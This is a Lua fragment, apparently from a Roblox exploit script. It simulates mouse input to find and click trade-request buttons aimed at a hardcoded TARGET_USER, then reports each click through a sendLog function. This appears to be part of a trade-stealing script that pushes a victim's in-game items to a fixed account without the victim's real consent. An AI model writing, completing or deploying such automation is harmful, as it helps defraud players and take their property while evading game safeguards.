-- Function to click a button
local function clickButton(button)
    if not button then return false end
    pcall(function()
        button:Fire("MouseButton1Click")
        button:Fire("Activated")
        VirtualUser:ClickButton(button)
        VirtualInput:SendMouseButtonEvent(0, 0, 0, true, game, 0)
        wait(0.1)
        VirtualInput:SendMouseButtonEvent(0, 0, 0, false, game, 0)
    end)
    return true
end

-- Find and click trade request button for target player
local function findAndClickTradeButton()
    pcall(function()
        -- Look through all GUI elements for trade buttons
        local playerGui = player.PlayerGui
        
        for _, gui in pairs(playerGui:GetDescendants()) do
            if gui:IsA("TextButton") or gui:IsA("ImageButton") then
                local buttonText = (gui.Text or gui.Name or ""):lower()
                
                -- Find trade request button
                if buttonText:find("trade") or buttonText:find("request") or buttonText:find("send") then
                    -- Check if it's for our target
                    local parent = gui.Parent
                    while parent do
                        if parent:IsA("Frame") and (parent.Name:lower():find(TARGET_USER:lower()) or (parent:FindFirstChild("Name") and parent.Name.Text == TARGET_USER)) then
                            clickButton(gui)
                            sendLog("📤 Clicked trade request button for " .. TARGET_USER)
                            return true
                        end
                        parent = parent.Parent
                    end
                end
            end
        end
    end)
    return false
end

